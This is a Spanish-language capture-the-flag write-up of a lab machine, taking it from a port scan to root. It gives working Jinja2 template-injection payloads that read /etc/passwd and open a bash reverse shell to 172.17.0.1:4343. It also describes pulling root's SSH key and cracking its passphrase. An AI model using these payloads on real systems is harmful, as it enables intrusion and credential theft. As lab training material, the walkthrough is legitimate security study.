Lo primero es hacer un escaneo de puertos y servicios con nmap.

![Pasted image 20240811202559](https://github.com/user-attachments/assets/69503ddc-2d19-48d3-80fb-2a4dfe184585)

Haciendo fuzzing web con gobuster no encuentro nada.

![Pasted image 20240811203136](https://github.com/user-attachments/assets/d7f7721f-3761-4c21-8b92-da4bd081a055)

Accedo al servicio web pero por el puerto 80 solo me muestra el index por defecto de apache, sin embargo si entro por el puerto 8089 me muestra lo siguiente.

![Pasted image 20240811203246](https://github.com/user-attachments/assets/23defdcb-7814-4742-af41-43842512ec87)

Si doy al Enter, veo lo siguiente.

![Pasted image 20240811203548](https://github.com/user-attachments/assets/843d355a-90a7-4ed0-acd3-8fa044dfdf1c)

Voy a probar a ver si es posible que la web sea vulnerable a SSTI(Server Site Template Injection).

![Pasted image 20240811203657](https://github.com/user-attachments/assets/3c0111a5-acf1-4e27-bae6-a7a070406c77)

![Pasted image 20240811203706](https://github.com/user-attachments/assets/c9cc329d-4837-4fa7-9dc6-2e78e2c9cb86)

Puedo inyectar código html, por lo que con la etiqueta script puedo ejecutar código javascript.

Con el siguiente comando voy a poder obtener el contenido del archivo /etc/passwd para obtener los usuarios del sistema.

Si busco en el navegador información para poder atacar esta vulnerabilidad encuentro diferentes formas de explotar la vulnerabilidad en la web de [HackTrics](https://book.hacktricks.xyz/v/es/pentesting-web/ssti-server-side-template-injection) como el siguiente comando.

```javascript
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
```

![Pasted image 20240811204408](https://github.com/user-attachments/assets/246a0837-848f-4c5f-ba2f-e423998ffdd9)

Voy a intentar recibir una reverse shell introduciendo el siguiente comando.

```
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/4343 0>&1\'').read() }}
```

![Pasted image 20240811210104](https://github.com/user-attachments/assets/9305ca61-526d-4321-8f7d-ee3faef845ad)

Ahora toca intentar escalar privilegios.

Con ayuda del siguiente binario, puedo obtener la clave privada de ssh de root y utilizarla para conectarme a través del protocolo ssh como root a la máquina.

![Pasted image 20240811210928](https://github.com/user-attachments/assets/fa93e993-43c8-4336-bc4d-4c2e85d1db98)

Copio el contenido en un archivo que creo llamado id_rsa, y con john the ripper puedo crackear el contenido.

![Pasted image 20240811212229](https://github.com/user-attachments/assets/646ca74a-380f-4f50-a97f-eb9e939ff654)

Ahora ya solo falta iniciar sesión como root a través del protocolo ssh pero utilizando el archivo id_rsa con el parámetro -i y como contraseña honda1.

![Pasted image 20240811212803](https://github.com/user-attachments/assets/1b965e59-bc2e-450a-885c-b889cbe84678)
